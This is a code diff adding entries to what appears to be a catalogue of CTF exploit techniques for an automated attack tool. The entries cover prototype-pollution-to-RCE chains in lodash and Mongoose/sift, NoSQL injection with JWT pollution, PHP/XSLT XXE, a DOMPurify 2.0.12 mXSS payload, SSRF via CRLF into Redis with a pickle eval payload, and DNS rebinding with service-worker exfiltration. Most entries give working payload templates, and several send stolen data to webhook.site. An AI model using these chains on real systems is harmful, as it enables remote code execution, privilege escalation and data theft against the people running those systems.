+            "kind": "exploit_technique",
+            "name": "lodash _.set() constructor.prototype pollution → Mongoose populate + sift $where → new Function() RCE",
+            "applies_when": (
+                "POST /config calls `_.set(config, path, value)` where path is an array like "
+                "`['constructor','prototype','select']`. A blacklist checks for forbidden strings "
+                "but can be bypassed via String.fromCharCode(). The main route does "
+                "`Quote.find({}).populate('author','name')` — polluted Object.prototype.select "
+                "and Object.prototype.populate force additional Mongoose behavior. "
+                "When match is an array, Mongoose's assignVals uses sift(), and sift's $where "
+                "implementation calls `new Function('obj','return '+payload)` → RCE."
+            ),
+            "prerequisites": [
+                "lodash _.set() with array path input (enables constructor.prototype access)",
+                "Mongoose populate() reading inherited options from prototype",
+                "sift 'where' implementation using new Function()",
+                "Blacklist bypassable via String.fromCharCode()",
+                "Quote ObjectId obtainable from page",
+            ],
+            "technique_steps_md": (
+                "1. GET / to obtain a quote ObjectId (qid).\n"
+                "2. POST /config to pollute Object.prototype.select:\n"
+                "   `{tmp: {$cond: [{$ifNull: ['$secret', false]}, {$toObjectId: qid}, null]}}`\n"
+                "3. POST /config to pollute Object.prototype.populate:\n"
+                "   `[{path:'tmp', model:'Quote', match:[{$or:[{$where: PAYLOAD}]}], strictPopulate:false}]`\n"
+                "4. Stage 1 $where payload: leak `this.constructor.db.host|port|name` → <cite> output.\n"
+                "5. Stage 2 $where payload: `process.binding('spawn_sync').spawn(...)` to run "
+                "child `node -e \"...\"` that connects to leaked MongoDB, reads all authors.secret, "
+                "XOR-decrypts /flag.\n"
+                "6. GET / to trigger populate chain → flag appears in page."
+            ),
+            "code_template": (
+                "body = {\n"
+                "  config_name: [['constructor','prototype','select'], ['constructor','prototype','populate']],\n"
+                "  value: [\n"
+                "    {tmp: {$cond: [{$ifNull: ['$secret', false]}, {$toObjectId: qid}, null]}},\n"
+                "    [{path:'tmp', model:'Quote', match:[{$or:[{$where: payload}]}], strictPopulate:false, populate:null}]\n"
+                "  ]\n"
+                "}"
+            ),
+            "examples": [{
+                "params": {
+                    "blacklist_bypass": "String.fromCharCode() for '/', '.', 'output', 'client'",
+                    "rce_method": "process.binding('spawn_sync').spawn({file:'node',args:['node','-e',script]})",
+                    "decrypt": "XOR each author.secret with /flag bytes → find DH{...} match",
+                },
+                "notes": (
+                    "Two-stage RCE: first leak DB connection info, then spawn child process for "
+                    "full MongoDB access. The blacklist bypass via String.fromCharCode() and "
+                    "bracket notation is essential. Object.values(result)[2][1] replaces .output "
+                    "to avoid blacklist."
+                ),
+            }],
+            "tags": ["prototype-pollution", "lodash", "mongoose", "sift", "where", "rce", "nodejs", "blacklist-bypass"],
+        },
+    },
+    # ── T-13 ──────────────────────────────────────────────────────────────
+    {
+        "name": "nosqli_jwt_flatnest_circular_prototype_pollution_rce",
+        "vuln_type": "nosqli",
+        "sub_technique": "operator_injection_flatnest_circular_pp_rce",
+        "category": "exploitation",
+        "safety_level": "destructive",
+        "tags": ["nosqli", "operator-injection", "jwt", "flatnest", "circular-reference", "prototype-pollution", "mongoose", "sift", "rce"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "MongoDB operator injection + JWT flatnest circular ref → prototype pollution → Mongoose sift $where RCE",
+            "applies_when": (
+                "Login uses `username.length` for validation (bypassed with object input) and "
+                "`distinct('password', {username})` for DB query (accepts operator objects). "
+                "JWT payload is built via `flatten(username_obj)` and restored with `nest(payload)`. "
+                "flatnest restores `[Circular (...)]` strings as actual references, enabling "
+                "prototype pollution via the JWT token itself. Guards use `roles.includes()` which "
+                "breaks when Array.prototype.includes is overwritten with Array.prototype.at."
+            ),
+            "prerequisites": [
+                "NestJS with Mongoose + sift 17.1.3",
+                "flatnest flatten()/nest() used in JWT creation/verification",
+                "Login accepts non-string username (no type check before .length)",
+                "Scene model with frames: string[] matching user usernames",
+                "trim: true on username schema (allows trailing space registration trick)",
+            ],
+            "technique_steps_md": (
+                "1. Register `scene-1 ` (trailing space) → stored as `scene-1` (trim).\n"
+                "2. Second login with object username:\n"
+                "   `{$eq:'scene-1', $not:{$geoIntersects:{$geometry:{...pollution keys...}}}}`\n"
+                "3. Pollution keys in $geometry via flatnest Circular references:\n"
+                "   - `a` → Array.prototype, `a.includes` → Array.prototype.at (ADMIN bypass)\n"
+                "   - `b` → Object.prototype, `b.populate[0]` → {path:'frames', model:'User', ...}\n"
+                "   - `b.$where` → RCE payload string\n"
+                "4. JWT token carries all pollution. On any authenticated request, nest() "
+                "restores circular refs → pollution applied.\n"
+                "5. GET /api/scene (ADMIN-only): guard passes because includes=at returns truthy.\n"
+                "6. sceneModel.find() inherits polluted populate → frames joined to User model.\n"
+                "7. match[1] has no own $where (bypasses throwOn$where), but inherits it from prototype.\n"
+                "8. sift executes `new Function('obj', 'return '+payload)` → reads /flag, "
+                "writes to User.password.\n"
+                "9. Response contains populated User with flag in password field."
+            ),
+            "code_template": (
+                "geometry = {\n"
+                "    'type': 'Point', 'coordinates': [0,0], 'x': [1],\n"
+                "    'a': '[Circular (...x.constructor.prototype)]',\n"
+                "    'a.includes': '[Circular (...x.constructor.prototype.at)]',\n"
+                "    'b': '[Circular (...x.constructor.prototype.__proto__)]',\n"
+                "    'b.populate[0].path': 'frames', 'b.populate[0].model': 'User',\n"
+                "    'b.$where': '((()=>{...read /flag...this.password=flag;return true})())',\n"
+                "}\n"
+                "login_body = {'username': {'$eq': scene_name, '$not': {'$geoIntersects': {'$geometry': geometry}}}, 'password': pw}"
+            ),
+            "examples": [{
+                "params": {
+                    "admin_bypass": "Array.prototype.includes = Array.prototype.at → ['ADMIN'].at('USER') returns 'ADMIN' (truthy)",
+                    "throwon_where_bypass": "Object.keys(match[1]) has no $where → only inherited from prototype",
+                    "cleanup": "RCE payload restores Array.prototype.includes and deletes polluted properties",
+                },
+                "notes": (
+                    "Single login request achieves both privilege escalation and RCE setup. "
+                    "The flatnest circular reference feature is the critical enabler — it converts "
+                    "string markers in JWT into actual JavaScript object references at nest() time."
+                ),
+            }],
+            "tags": ["nosqli", "operator-injection", "jwt", "flatnest", "circular-reference", "prototype-pollution", "mongoose", "sift", "rce"],
+        },
+    },
+    # ── T-14 ──────────────────────────────────────────────────────────────
+    {
+        "name": "php7_array_key_dechunk_chrome_xslt_xxe",
+        "vuln_type": "xxe",
+        "sub_technique": "php7_array_key_xslt_xxe",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["php7", "array-key", "dechunk", "stream-filter", "xslt", "xxe", "chrome", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "PHP7 name[name name array key injection + data: dechunk stream → Chrome XSLT XXE entity exfil",
+            "applies_when": (
+                "upload.php reads `$_POST['name_name name']` but PHP7 parses `name[name name` "
+                "as a different key. A filter field accepts `resource=data:,<chunked_b64>|dechunk` "
+                "which bypasses `.`/`/` character restrictions. Empty name → saved as `.png` → "
+                "Apache omits Content-Type → Chrome sniffs as XML. Bot (JS disabled) still "
+                "processes XSLT. XSL with `<!ENTITY SYSTEM>` reads localhost/flag.php."
+            ),
+            "prerequisites": [
+                "PHP7 POST key parsing quirk (bracket→underscore transformation)",
+                "Stream filter accepting data: scheme with dechunk wrapper",
+                "Apache serving .png without explicit Content-Type header",
+                "Chrome XSLT processing active even with JS disabled",
+                "Bot visiting uploaded file URL",
+                "Webhook endpoint for exfiltration",
+            ],
+            "technique_steps_md": (
+                "1. Build XSL payload with `<!ENTITY xxe SYSTEM 'http://localhost/flag.php'>`.\n"
+                "2. Build XML: `<?xml-stylesheet type='text/xsl' href='data:text/plain;base64,{xsl_b64}'?><a/>`\n"
+                "3. Base64-encode XML. Re-roll padding until no `/` in b64 output.\n"
+                "4. Construct dechunk stream: `resource=data:,{hex_len}%0D%0A{safe_b64}%0D%0A0%0D%0A%0D%0A|dechunk`\n"
+                "5. POST to /upload.php with `name[name name=` (empty) and `filter_filter_filter={stream}`.\n"
+                "6. File saved as `.png` (empty name). Find path from /list.php.\n"
+                "7. Submit path to /bot.php.\n"
+                "8. Chrome opens .png → no Content-Type → sniffs XML → processes XSLT → "
+                "entity fetches localhost/flag.php → exfils to webhook via `<img src>`.\n"
+                "9. Poll webhook for flag."
+            ),
+            "code_template": (
+                "xsl = ('<?xml version=\"1.0\"?>'\n"
+                "       '<!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://localhost/flag.php\">]>'\n"
+                "       '<xsl:stylesheet ...><xsl:template match=\"/a\"><html>'\n"
+                "       f'<img><xsl:attribute name=\"src\">{webhook}?d=&xxe;</xsl:attribute></img>'\n"
+                "       '</html></xsl:template></xsl:stylesheet>')\n"
+                "xml = f'<?xml-stylesheet type=\"text/xsl\" href=\"data:text/plain;base64,{b64(xsl)}\"?><a/>'\n"
+                "data = {'name[name name': '', 'filter_filter_filter': f'resource=data:,{chunk}|dechunk'}"
+            ),
+            "examples": [{
+                "params": {
+                    "php_quirk": "name[name name → $_POST['name_name name'] (bracket→underscore)",
+                    "dechunk": "Chunked transfer decoding as PHP stream filter",
+                    "b64_constraint": "No / in base64 (re-roll with padding until safe)",
+                },
+                "notes": (
+                    "Three separate quirks chained: PHP7 key parsing, Apache content-type omission "
+                    "for .png, and Chrome's XSLT engine processing even when JS is disabled. "
+                    "The dechunk stream filter is used to bypass character restrictions in the "
+                    "filter parameter."
+                ),
+            }],
+            "tags": ["php7", "array-key", "dechunk", "stream-filter", "xslt", "xxe", "chrome", "bot"],
+        },
+    },
+    # ── T-15 ──────────────────────────────────────────────────────────────
+    {
+        "name": "dompurify_2_0_12_mxss_protocol_relative_url",
+        "vuln_type": "xss",
+        "sub_technique": "dompurify_mxss_protocol_relative",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["dompurify", "mxss", "math", "protocol-relative", "webhook", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "DOMPurify 2.0.12 mXSS bypass (math/mtext/mglyph/style) + protocol-relative URL SSRF",
+            "applies_when": (
+                "DOMPurify 2.0.12 has a mutation XSS bug: `<math><mtext><table><mglyph><style>` "
+                "causes the style tag's content to be reinterpreted as HTML after DOM mutation, "
+                "allowing `<img onerror=...>` execution. The app fetches product details from a "
+                "URL path that can be manipulated via `/#/%2f` to become `//webhook.site/...` "
+                "(protocol-relative URL), loading attacker-controlled JSON with the mXSS payload."
+            ),
+            "prerequisites": [
+                "DOMPurify 2.0.12 with known mXSS bug",
+                "Bot renders product detail HTML from fetched JSON",
+                "URL path uses `/#/` fragment routing where `%2f` decodes to `/`",
+                "webhook.site or similar service for JSON response + CORS headers",
+            ],
+            "technique_steps_md": (
+                "1. Encode JS payload as base64: `fetch('/4/buy',{method:'POST',...}).then(...)→webhook`\n"
+                "2. Build mXSS payload:\n"
+                "   `<math><mtext><table><mglyph><style><!--</style><img title=\"--></mglyph>"
+                "<img src=x onerror=eval(atob('...'))>\">`\n"
+                "3. Configure webhook.site response: JSON `{\"detail\": mxss_payload}` with CORS headers.\n"
+                "4. Login as guest, submit report with path: `/#/%2fwebhook.site/{UUID}/detail`\n"
+                "5. Bot navigates to `/#//webhook.site/{UUID}/detail` → fetches attacker JSON.\n"
+                "6. mXSS fires → JS calls /4/buy → flag data sent to webhook."
+            ),
+            "code_template": (
+                "js = f\"fetch('/4/buy',{{method:'POST',headers:{{'token':document.cookie.split('=')[1]}}}}).then(r=>r.json()).then(d=>new Image().src='https://webhook.site/{UUID}/flag?d='+d.data)\"\n"
+                "mxss = f'<math><mtext><table><mglyph><style><!--</style><img title=\"--></mglyph><img src=x onerror=eval(atob(\\'{b64(js)}\\'))>\">'\n"
+                "report_path = f'/#/%2fwebhook.site%2f{UUID}/detail'"
+            ),
+            "examples": [{
+                "params": {
+                    "dompurify_version": "2.0.12",
+                    "mxss_trigger": "math→mtext→table→mglyph→style mutation",
+                    "url_trick": "%2f → / → protocol-relative //webhook.site/...",
+                },
+                "notes": (
+                    "DOMPurify 2.0.12 is a well-known vulnerable version. The mXSS relies on "
+                    "HTML5 parsing spec differences between the initial sanitization parse and "
+                    "the final DOM insertion. The protocol-relative URL trick via fragment routing "
+                    "is a neat SSRF primitive."
+                ),
+            }],
+            "tags": ["dompurify", "mxss", "math", "protocol-relative", "webhook", "bot"],
+        },
+    },
+    # ── T-16 ──────────────────────────────────────────────────────────────
+    {
+        "name": "ssrf_crlf_redis_cacheops_pickle_rce",
+        "vuln_type": "deserialization",
+        "sub_technique": "ssrf_crlf_redis_pickle",
+        "category": "exploitation",
+        "safety_level": "destructive",
+        "tags": ["x-forwarded-for", "ssrf", "xhtml2pdf", "crlf", "redis", "cacheops", "pickle", "rce", "django"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "X-Forwarded-For bypass + xhtml2pdf SSRF + CRLF Redis inline protocol → cacheops pickle.loads() RCE",
+            "applies_when": (
+                "A Django app trusts X-Forwarded-For for IP checks (internal-only endpoints). "
+                "User-controlled signpath is rendered as `<img src>` in PDF via xhtml2pdf, "
+                "creating an SSRF primitive. Setting signpath to `http://redis:6379/\\r\\n...` "
+                "injects Redis inline commands via CRLF. cacheops stores ORM query results in "
+                "Redis DB 1 as pickle, and cache reads trigger pickle.loads() → RCE."
+            ),
+            "prerequisites": [
+                "X-Forwarded-For trusted by get_client_ip() (no proxy validation)",
+                "signpath stored without URL validation (broken validate() method)",
+                "xhtml2pdf fetches <img src> during PDF rendering (SSRF)",
+                "Internal Redis reachable from app container",
+                "cacheops enabled with pickle serialization on sign_service models",
+                "Attacker can compute cacheops cache key (q:<md5> from query + model + fields)",
+            ],
+            "technique_steps_md": (
+                "1. Sign up attacker account.\n"
+                "2. Find own uid by brute-scanning /document/1/render_internal/{uid} "
+                "with X-Forwarded-For: 127.0.0.1.\n"
+                "3. Compute cacheops cache key for `<UserModel>.objects.get(pk=uid)`: "
+                "md5 of (QuerySet class + model path + field stamp + SQL + ModelIterable class).\n"
+                "4. Build pickle payload: `builtins.eval(\"Document.objects.create(..., "
+                "contents=open('/flag').read())\")`.\n"
+                "5. Set signpath to: `http://redis:6379/\\r\\nSELECT 1\\r\\nSET q:{key} "
+                "\"{escaped_pickle}\"\\r\\nPING`\n"
+                "6. POST /document/1 (sign) → xhtml2pdf fetches signpath → CRLF → Redis SET.\n"
+                "7. GET /document/1/render_internal/{uid} with XFF → cache read → pickle.loads() → RCE.\n"
+                "8. Login as second account, find 'owned' document, read flag from textarea."
+            ),
+            "code_template": (
+                "# Cache key computation\n"
+                "md5 = hashlib.md5()\n"
+                "for part in ('django.db.models.query.QuerySet', '<app>.models.<UserModel>',\n"
+                "             field_stamp, sql, 'django.db.models.query.ModelIterable'):\n"
+                "    md5.update(part.encode())\n"
+                "key = 'q:' + md5.hexdigest()\n"
+                "# Pickle payload (no class needed)\n"
+                "pickle_bytes = b'cbuiltins\\neval\\n(S' + repr(expr).encode() + b'\\ntR.'\n"
+                "sign_url = f'http://redis:6379/\\r\\nSELECT 1\\r\\nSET {key} \"{escape(pickle_bytes)}\"\\r\\nPING'"
+            ),
+            "examples": [{
+                "params": {
+                    "broken_validation": "SignForm.validate() reads self.cleaned_data.get('') (wrong key)",
+                    "crlf_terminator": "\\r\\nPING absorbs trailing HTTP/1.1 header junk",
+                    "two_accounts": "Attacker account (cache poison) + reader account (flag retrieval)",
+                },
+                "notes": (
+                    "Attacker session breaks after pickle.loads() corrupts the cached User object. "
+                    "A second account is essential for stable flag retrieval. The PING at the end of "
+                    "the Redis command sequence absorbs the `HTTP/1.1` suffix that xhtml2pdf appends."
+                ),
+            }],
+            "tags": ["x-forwarded-for", "ssrf", "xhtml2pdf", "crlf", "redis", "cacheops", "pickle", "rce", "django"],
+        },
+    },
+    # ── T-17 ──────────────────────────────────────────────────────────────
+    {
+        "name": "dns_rebinding_sw_speculation_rules_prefetch_exfil",
+        "vuln_type": "xss",
+        "sub_technique": "dns_rebinding_sw_prefetch",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["dns-rebinding", "service-worker", "speculation-rules", "prefetch", "sec-fetch", "pna-bypass", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "DNS rebinding → admin login + speculationrules prefetch + Service Worker head/tail split exfil",
+            "applies_when": (
+                "The target checks sec-fetch-mode/sec-fetch-dest headers: `document` requests return "
+                "only first 8 chars of flag, other modes return the tail. PNA (Private Network Access) "
+                "blocks direct JS fetch to 127.0.0.1. DNS rebinding (rbndr.us) is needed to get "
+                "same-origin JS execution on localhost. Service Worker intercepts navigate requests "
+                "to exfil tail, while speculationrules prefetch + cache read recovers head."
+            ),
+            "prerequisites": [
+                "sec-fetch-dest=document returns partial flag (head)",
+                "Other sec-fetch-dest returns remaining flag (tail)",
+                "PNA blocking direct fetch to 127.0.0.1 from external origins",
+                "DNS rebinding service (rbndr.us or equivalent)",
+                "Chrome with Service Worker and Speculation Rules support",
+                "CSRF token required for login/register",
+            ],
+            "technique_steps_md": (
+                "1. Register user + get CSRF token + session cookie from target (ex1.py).\n"
+                "2. Set up Flask server (ex2.py) on attacker IP, serving /final and /sw.js.\n"
+                "3. /final HTML: registers Service Worker, sets session cookie, flushes DNS cache "
+                "(1000 requests to nip.io), logs in as admin via form POST, creates speculationrules "
+                "for /flag prefetch.\n"
+                "4. /sw.js: intercepts navigate to /flag → exfils tail to listener. On message "
+                "event, fetches /flag?head=1 with cache: only-if-cached → exfils head.\n"
+                "5. DNS rebinding: initial resolution → attacker IP, subsequent → 127.0.0.1.\n"
+                "   URL: `http://{attacker_hex}.7f000001.rbndr.us:{port}/final`\n"
+                "6. Submit URL to /report. Bot opens it.\n"
+                "7. After DNS rebind, form POST to /login hits localhost → admin session.\n"
+                "8. Speculation rules prefetch /flag?head=1 (cached) and /flag?pre=... (SW intercepts tail).\n"
+                "9. SW message: cache-only fetch for head. Combine head + tail = full flag."
+            ),
+            "code_template": (
+                "# DNS rebinding URL\n"
+                "url = f'http://{attacker_hex}.7f000001.rbndr.us:{port}/final'\n"
+                "# Speculation rules (injected by /final JS)\n"
+                "spec = JSON.stringify({prefetch: [{source: 'list', urls: ['/flag?head=1', '/flag?pre=...']}]})\n"
+                "# SW tail exfil\n"
+                "self.addEventListener('fetch', (event) => {\n"
+                "  if (url.pathname === '/flag' && event.request.mode === 'navigate') {\n"
+                "    event.respondWith(fetch(event.request).then(res => { /* clone + exfil tail */ }))\n"
+                "  }\n"
+                "})"
+            ),
+            "examples": [{
+                "params": {
+                    "dns_service": "rbndr.us ({attacker_hex}.{target_hex}.rbndr.us)",
+                    "dns_flush": "1000 requests to nip.io to evict Chrome DNS cache",
+                    "flag_split": "sec-fetch-dest=document → head (8 chars), other → tail",
+                },
+                "notes": (
+                    "PNA prevents simple fetch to 127.0.0.1 but DNS rebinding bypasses this. "
+                    "The Speculation Rules API enables prefetch without full navigation. "
+                    "Service Worker is essential because the flag endpoint splits output by "
+                    "sec-fetch-dest, requiring both a navigate request (tail) and a cached "
+                    "prefetch (head)."
+                ),
+            }],
+            "tags": ["dns-rebinding", "service-worker", "speculation-rules", "prefetch", "sec-fetch", "pna-bypass", "bot"],
+        },
+    },
 ]
 
 
